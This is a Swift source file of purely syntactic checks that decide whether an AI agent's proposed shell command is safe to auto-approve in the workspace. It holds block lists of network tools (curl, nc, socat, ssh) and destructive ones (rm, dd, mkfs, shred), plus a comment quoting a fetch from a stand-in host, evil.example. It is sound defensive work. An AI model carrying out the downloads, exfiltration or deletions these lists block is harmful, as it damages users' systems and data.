import Foundation

/// Shared, purely-syntactic safety checks for a single shell command string. Used by the shell
/// intent policies (`StaticSafetyBuildRunShellPolicy`, `StaticSafetyRunIntentShellPolicy`) so the
/// definition of "a single, workspace-scoped, non-escaping command" lives in exactly one place.
///
/// These are static-analysis heuristics layered ON TOP of the hard-deny floors (which always run
/// first in Auto mode) — never a replacement for them. They intentionally err toward rejecting:
/// anything that chains, redirects, reaches outside the workspace tree, or talks to the network is
/// treated as not-statically-safe, so the model reviewer (or the user) decides instead.
enum StaticSafetyShellCommandSafety {
    /// A single foreground command: no operator that chains, redirects, substitutes, pipes, or
    /// backgrounds. One of these characters is enough to disqualify — "verify … then exfiltrate"
    /// needs a chaining operator, and every one of them is here.
    static func isSingleCommand(_ command: String) -> Bool {
        [";", "&&", "||", "|", "`", "$(", ">", "<", "&", "\n"].allSatisfy { !command.contains($0) }
    }

    /// An argument that cannot reach outside the workspace tree: not absolute, not a `~` home path,
    /// no `..` parent-directory traversal. (Relative paths, flags, subcommands, and module names all
    /// pass.) Traversal is detected on path SEGMENTS, not a raw substring, so `../x` / `a/../b` / `..`
    /// are rejected while Go's `./...` "all packages" wildcard (segments ".", "...") is allowed.
    static func isSafeArgument(_ argument: String) -> Bool {
        if argument.hasPrefix("/") { return false }
        if argument.hasPrefix("~") { return false }
        if argument.split(separator: "/", omittingEmptySubsequences: false).contains("..") { return false }
        return true
    }

    /// The last path component of an executable token: `/usr/bin/curl` and `./bin/curl` → `curl`.
    static func basename(_ token: String) -> String {
        token.split(separator: "/").last.map(String.init) ?? token
    }

    /// A URL/scheme reference anywhere in the command (`http://`, `https://`, `ftp://`, `ssh://`, …).
    /// This is what catches `curl https://evil.example/x.sh` — whose only "argument" is a URL, not a
    /// filesystem path, so the absolute-path check alone would miss it.
    static func containsNetworkReference(_ command: String) -> Bool {
        command.lowercased().contains("://")
    }

    /// Tools whose whole job is to move bytes over the network. A static approval must never cover
    /// these on a bare intent word — exfiltration/download is exactly the hole being closed.
    static let networkExecutables: Set<String> = [
        "curl", "wget", "nc", "ncat", "netcat", "socat",
        "ssh", "scp", "sftp", "telnet", "rsync", "ftp",
    ]

    static func isNetworkExecutable(_ token: String) -> Bool {
        networkExecutables.contains(basename(token))
    }

    /// Irreversible filesystem/device destroyers. Auto mode already allows workspace *mutation* via
    /// the file tools, but a recursive delete or a raw-device write is a different class of blast
    /// radius and must be named explicitly, never ridden in on "run the tests".
    static let destructiveExecutables: Set<String> = [
        "rm", "rmdir", "dd", "mkfs", "shred", "srm", "fdisk", "wipefs",
    ]

    static func isDestructiveExecutable(_ token: String) -> Bool {
        destructiveExecutables.contains(basename(token))
    }

    /// The command is a single foreground invocation that stays inside the workspace and does not
    /// reach the network or destroy anything: safe to statically approve under an explicit run
    /// intent. Hard-deny floors still run first; this only ever ADDS an approval, never removes a
    /// denial.
    static func isWorkspaceScopedSafeCommand(_ command: String) -> Bool {
        let trimmed = command.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmed.isEmpty else { return false }
        guard isSingleCommand(trimmed) else { return false }
        guard !containsNetworkReference(trimmed) else { return false }
        let tokens = trimmed.split(whereSeparator: { $0 == " " || $0 == "\t" }).map(String.init)
        guard let head = tokens.first else { return false }
        guard !isNetworkExecutable(head), !isDestructiveExecutable(head) else { return false }
        return tokens.dropFirst().allSatisfy(isSafeArgument)
    }
}
